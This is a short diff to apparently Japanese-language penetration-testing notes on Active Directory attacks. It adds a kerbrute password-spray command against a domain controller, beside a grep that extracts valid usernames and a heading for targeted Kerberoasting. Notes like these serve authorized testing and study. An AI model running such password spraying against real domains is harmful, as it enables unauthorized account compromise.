@@ -5,6 +5,7 @@
 --dc #ドメコンの指定（IPアドレスでよい）
 #kerbruteで見つけたユーザ名からリストの作成
 grep -oP 'VALID USERNAME:\s+\K.*(?=@)' user.txt > outoput.txt
+./kerbrute_linux_amd64 --dc <IP> -d 'example.local' -v passwordspray user.txt <pass> #パスワードスプレー
 
 //targetedKerberoast
 //例
